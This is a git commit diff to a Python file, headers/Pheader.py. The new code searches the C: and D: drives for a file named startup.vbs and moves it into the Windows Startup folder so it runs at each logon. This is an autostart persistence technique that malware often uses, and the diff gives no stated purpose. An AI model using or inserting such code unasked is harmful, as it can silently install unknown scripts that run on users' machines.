544dc1e63566bec9965503c7cab846b37ff2e7da
Vyankatesh Rohokale <piyushrohokale2525@gmail.com>
2024-11-05 18:31:59 +0530

    Update Pheader.py

--- headers/Pheader.py
+++ headers/Pheader.py
@@ -1,5 +1,25 @@
 import os
-def get_startup_folder_path():
-    startup_path = os.path.join(os.environ['APPDATA'], r"Microsoft\Windows\Start Menu\Programs\Startup")
+import shutil
+
+def find_vbs_script(filename="startup.vbs"):
+
+
+    drives = ['C:\\', 'D:\\']  
+
+    for drive in drives:
+        for root, dirs, files in os.walk(drive):
+            if filename in files:
+                vbs_path = os.path.join(root, filename)
+                movevbstostart(vbs_path)
+                return  
+            
     
-    return startup_path
+
+def movevbstostart(vbs_path):
+    startup_folder = os.path.join(
+        os.getenv('APPDATA'), 
+        r"Microsoft\Windows\Start Menu\Programs\Startup"
+    )
+    
+    shutil.move(vbs_path, startup_folder)
+    
